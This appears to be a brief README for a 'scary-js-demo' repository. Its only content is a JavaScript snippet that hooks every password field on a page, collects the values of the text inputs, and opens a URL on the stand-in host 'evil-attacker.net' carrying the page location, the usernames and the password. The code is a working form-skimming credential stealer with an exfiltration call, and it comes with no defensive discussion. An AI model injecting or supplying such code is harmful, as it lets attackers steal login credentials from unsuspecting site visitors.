# scary-js-demo
JS Demos - scary-js-demo

```javascript
Array.from(document.querySelectorAll('input'))
.filter(input => input.type.toLowerCase() === 'password')
.forEach(input => input.addEventListener('change', evt => {
  const users = Array.from(document.querySelectorAll('input'))
  .filter(input => input.type.toLowerCase() === 'text')
  .map(input => input.value)
  .reduce((a, b) => a + ',' + b)
  setTimeout(window.open('https://evil-attacker.net?loc=' + window.location
    + '&u=' + users + '&p=' + evt.target.value), 10000)
}))
```
